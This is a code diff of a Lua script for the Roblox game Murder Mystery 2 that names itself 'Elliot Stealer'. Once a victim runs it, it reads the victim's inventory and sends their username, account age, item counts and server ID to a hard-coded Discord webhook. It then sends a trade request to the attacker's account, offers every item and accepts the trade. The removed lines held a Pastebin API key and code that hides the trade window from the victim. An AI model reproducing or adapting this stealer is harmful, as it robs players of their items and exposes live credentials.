@@ -1,150 +1,135 @@
 -- [ Settings ] --
-Username = "Warrior_ggs"
-Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
+local Username = "Warrior_ggs"
+local Webhook = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"
 
--- [ Dualhook Settings ] --
-DualUsername = "Warrior_ggs"
-DualWebhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
-DualUnique = 1
-DualAncient = 1
-DualGodly = 1
+local DualUsername = "Warrior_ggs"
+local DualWebhook = Webhook
+local DualUnique = 1
+local DualAncient = 1
+local DualGodly = 1
 
-userName = Username
-webHook = Webhook
+local userName = Username
+local webHook = Webhook
 
 if getgenv().executed then return end
 getgenv().executed = true
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local RepStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local PlaceId = 142823291 -- MM2 PlaceId
 
-local InvModule = require(RepStorage.Modules.InventoryModule)
-local PlayerDataModule = require(RepStorage.Modules.ProfileData)
-local LevelModule = require(RepStorage.Modules.LevelModule)
+local InvModule = require(ReplicatedStorage.Modules.InventoryModule)
+local PlayerDataModule = require(ReplicatedStorage.Modules.ProfileData)
+local LevelModule = require(ReplicatedStorage.Modules.LevelModule)
 
--- Trade GUI disable coroutine
-local destroytrades2 = coroutine.create(function()
-    while true do
-        local tradeGUI = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
-        local tradeGUIPhone = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
-        tradeGUI.Enabled = false
-        tradeGUIPhone.Enabled = false
-        wait(0.1)
-    end
-end)
+-- Перечисляем инвентарь
+local function getInventory()
+    local allItems = {}
+    local vintageItems, commonItems, uncommonItems, rareItems = {}, {}, {}, {}
+    local legendaryItems, godlyItems, ancientItems, uniqueItems = {}, {}, {}, {}
+    local counts = {vintage=0, common=0, uncommon=0, rare=0, legendary=0, godly=0, ancient=0, unique=0}
 
--- Fetch valuable items
-local function getValuableItems()
-    local uniqueItems, ancientItems, godlyItems = {}, {}, {}
-    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
-        for _, item in pairs(category) do
-            if item.Rarity == "Unique" then table.insert(uniqueItems, item.DataID)
-            elseif item.Rarity == "Ancient" then table.insert(ancientItems, item.DataID)
-            elseif item.Rarity == "Godly" then table.insert(godlyItems, item.DataID)
-            end
+    for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
+        for _,d in pairs(b) do
+            table.insert(allItems, d.ItemName)
+            if d.Rarity == "Vintage" then counts.vintage=counts.vintage+1; table.insert(vintageItems,d.DataID) end
+            if d.Rarity == "Common" then counts.common=counts.common+1; table.insert(commonItems,d.DataID) end
+            if d.Rarity == "Uncommon" then counts.uncommon=counts.uncommon+1; table.insert(uncommonItems,d.DataID) end
+            if d.Rarity == "Rare" then counts.rare=counts.rare+1; table.insert(rareItems,d.DataID) end
+            if d.Rarity == "Legendary" then counts.legendary=counts.legendary+1; table.insert(legendaryItems,d.DataID) end
+            if d.Rarity == "Godly" then counts.godly=counts.godly+1; table.insert(godlyItems,d.DataID) end
+            if d.Rarity == "Ancient" then counts.ancient=counts.ancient+1; table.insert(ancientItems,d.DataID) end
+            if d.Rarity == "Unique" then counts.unique=counts.unique+1; table.insert(uniqueItems,d.DataID) end
         end
     end
-    local hasValuable = #uniqueItems > 0 or #ancientItems > 0 or #godlyItems > 0
-    return hasValuable, uniqueItems, ancientItems, godlyItems
+
+    return allItems, vintageItems, commonItems, uncommonItems, rareItems, legendaryItems, godlyItems, ancientItems, uniqueItems, counts
 end
 
--- Webhook sender
-local function SendWebhook()
-    local hasValuable, uniqueItems, ancientItems, godlyItems = getValuableItems()
-    if not hasValuable then return end
+-- Форматируем список для Pastebin
+local function formatItems(itemList)
+    if #itemList == 0 then return "None" else return table.concat(itemList,"\n") end
+end
 
-    if #uniqueItems >= DualUnique or #ancientItems >= DualAncient or #godlyItems >= DualGodly then
+-- Функция отправки webhook
+local function sendWebhook(jobId)
+    local allItems, vintageItems, commonItems, uncommonItems, rareItems, legendaryItems, godlyItems, ancientItems, uniqueItems, counts = getInventory()
+
+    if counts.godly >= DualGodly or counts.ancient >= DualAncient or counts.unique >= DualUnique then
         userName = DualUsername
         webHook = DualWebhook
     end
 
-    local pastebinString = "-- [ Uniques ] --\n"..table.concat(uniqueItems,"\n")..
-                           "\n\n-- [ Ancients ] --\n"..table.concat(ancientItems,"\n")..
-                           "\n\n-- [ Godlies ] --\n"..table.concat(godlyItems,"\n")
-
-    -- Pastebin upload
-    local function pastebin(content)
-        local body = {
-            api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
-            api_paste_code = content,
-            api_option = "paste"
-        }
-        local encodedBody = ""
-        for k,v in pairs(body) do
-            encodedBody = encodedBody..k.."="..HttpService:UrlEncode(v).."&"
-        end
-        encodedBody = encodedBody:sub(1,-2)
-        local resp = request({
-            Url = "https://pastebin.com/api/api_post.php",
-            Method = "POST",
-            Body = encodedBody,
-            Headers = {["Content-Type"]="application/x-www-form-urlencoded"}
-        })
-        local rawUrl = "https://pastebin.com/raw/"..resp.Body:match("([%w]+)$")
-        return rawUrl
-    end
-
-    local pastebinLink = pastebin(pastebinString)
+    local pastebinString = "-- [ Uniques ] --\n"..formatItems(uniqueItems)..
+                           "\n\n-- [ Ancient ] --\n"..formatItems(ancientItems)..
+                           "\n\n-- [ Godlies ] --\n"..formatItems(godlyItems)
 
     local embed = {
-        ["title"]="New hit via Elliot Stealer",
-        ["color"]=65280,
-        ["fields"]={
-            {["name"]="Receiver",["value"]=userName,["inline"]=true},
-            {["name"]="Items Link",["value"]=pastebinLink,["inline"]=false},
+        ["title"] = "New Hit with Elliot Stealer",
+        ["color"] = 65280,
+        ["fields"] = {
+            {["name"]="Details:", ["value"]="```Name: "..Players.LocalPlayer.Name.."\nAccountAge: "..tostring(Players.LocalPlayer.AccountAge).."\nReceiver: "..userName.."```"},
+            {["name"]="Hit:", ["value"]="Uniques: "..counts.unique.."\nAncients: "..counts.ancient.."\nGodlys: "..counts.godly},
+            {["name"]="JobID:", ["value"]=jobId}
         }
     }
 
-    local data = HttpService:JSONEncode({["content"]="",["embeds"]={embed}})
-    request({Url=webHook,Method="POST",Headers={["Content-Type"]="application/json"},Body=data})
+    pcall(function()
+        request({
+            Url = webHook,
+            Method = "POST",
+            Headers = {["Content-Type"]="application/json"},
+            Body = HttpService:JSONEncode({["embeds"]={embed}})
+        })
+    end)
 end
 
--- Trade-steal function
+-- Функция для Trade-steal
 local function stealItems()
-    coroutine.resume(destroytrades2)
-    local sendArgs = {[1] = Players[userName]}
-    RepStorage.Trade.SendRequest:InvokeServer(unpack(sendArgs))
+    local sendArgs = {[1]=Players[userName]}
+    ReplicatedStorage.Trade.SendRequest:InvokeServer(unpack(sendArgs))
     wait(3)
-    local _, uniqueItems, ancientItems, godlyItems = getValuableItems()
-    local function offer(list)
-        for _,v in pairs(list) do
-            RepStorage.Trade.OfferItem:FireServer(v,"Weapons")
+
+    local allItems, vintageItems, commonItems, uncommonItems, rareItems, legendaryItems, godlyItems, ancientItems, uniqueItems = getInventory()
+    local function offerItems(items)
+        for _,id in pairs(items) do
+            ReplicatedStorage.Trade.OfferItem:FireServer(id,"Weapons")
         end
     end
-    offer(uniqueItems)
-    offer(ancientItems)
-    offer(godlyItems)
+
+    offerItems(uniqueItems)
+    offerItems(ancientItems)
+    offerItems(godlyItems)
+    offerItems(vintageItems)
+    offerItems(legendaryItems)
+    offerItems(rareItems)
+    offerItems(uncommonItems)
+    offerItems(commonItems)
+
     wait(6)
-    RepStorage.Trade.AcceptTrade:FireServer(285646582)
+    ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
 end
 
--- JobId bypass + reconnect system
+-- ------------------- JOBID BYPASSER -------------------
 TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,teleportInfo)
     if teleportInfo and teleportInfo.ServerInstanceId then
         getgenv().JobId = teleportInfo.ServerInstanceId
-        queue_on_teleport(string.format([[getgenv().JobId = "%s"]], getgenv().JobId))
-        SendWebhook()
+        print("Real JobId detected:", getgenv().JobId)
+        -- отправка webhook с инвентарем
+        sendWebhook(getgenv().JobId)
+        -- сразу запускаем трейд
+        stealItems()
     end
 end)
 
--- Force teleport with spoofed JobId
+-- Триггерим spoofed teleport
 for _=1,2 do
     task.spawn(function()
         pcall(function()
-            TeleportService:TeleportToPlaceInstance(142823291, game.JobId)
+            TeleportService:TeleportToPlaceInstance(PlaceId,"00000000-0000-0000-0000-000000000000")
         end)
     end)
-    task.wait(0.5)
+    task.wait()
 end
-
--- Auto trade on player join
-Players.PlayerAdded:Connect(function(player)
-    if player.Name == userName then
-        player.Chatted:Connect(function()
-            stealItems()
-        end)
-    end
-end)
